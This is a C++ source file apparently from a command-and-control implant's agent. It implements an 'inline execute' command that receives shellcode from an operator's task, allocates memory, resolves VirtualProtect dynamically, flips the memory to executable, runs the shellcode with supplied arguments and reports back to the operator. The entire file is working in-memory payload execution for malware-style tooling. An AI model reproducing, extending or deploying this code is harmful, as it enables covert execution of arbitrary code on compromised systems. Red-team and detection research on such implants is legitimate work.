#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_INLINE_EXECUTE

using namespace stardust;
using namespace starburst;

typedef void ( *fn_pic )( char* args, int len );
typedef BOOL ( WINAPI *fn_VirtualProtect )( LPVOID, SIZE_T, DWORD, PDWORD );

auto declfn starburst::cmd_inline_execute(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // parse PIC bytes
    uint32_t pic_len = 0;
    auto pic_data = parser_bytes( params, &pic_len );
    if ( !pic_data || pic_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no PIC data provided" ) ) );
        return;
    }

    // parse arguments string
    uint32_t args_len = 0;
    auto args_str = parser_string( params, &args_len );

    // copy arguments to stack buffer (may be null if no args)
    char args_buf[1024] = { 0 };
    int  args_buf_len = 0;
    if ( args_str && args_len > 0 ) {
        uint32_t copy_len = args_len < 1023 ? args_len : 1023;
        memory::copy( args_buf, args_str, copy_len );
        args_buf[copy_len] = '\0';
        args_buf_len = (int)copy_len;
    }

    DBG_PRINT( inst, "cmd_inline_execute: %u bytes PIC, %d bytes args\n", pic_len, args_buf_len );

    // allocate RW memory for the PIC
    LPVOID mem = inst.kernel32.VirtualAlloc(
        nullptr, pic_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !mem ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "VirtualAlloc failed" ) ) );
        return;
    }

    // copy PIC into allocated memory
    memory::copy( mem, pic_data, pic_len );

    // change protection to RX
    auto pVirtualProtect = reinterpret_cast<fn_VirtualProtect>(
        inst.kernel32.GetProcAddress(
            (HMODULE)inst.kernel32.handle,
            symbol<LPCSTR>( "VirtualProtect" ) ) );

    if ( !pVirtualProtect ) {
        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "VirtualProtect resolve failed" ) ) );
        return;
    }

    DWORD old_protect = 0;
    if ( !pVirtualProtect( mem, pic_len, PAGE_EXECUTE_READ, &old_protect ) ) {
        inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "VirtualProtect failed" ) ) );
        return;
    }

    // cast and call the PIC
    auto pic_fn_ptr = reinterpret_cast<fn_pic>( mem );
    pic_fn_ptr( args_buf, args_buf_len );

    // free memory
    inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );

    // build success message
    char msg[96] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "Inline PIC executed (size: " ) ) );
    char num[16];
    int_to_str( num, pic_len, 10 );
    str_concat( msg, num );
    str_concat( msg, symbol<char*>( const_cast<char*>( " bytes)" ) ) );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
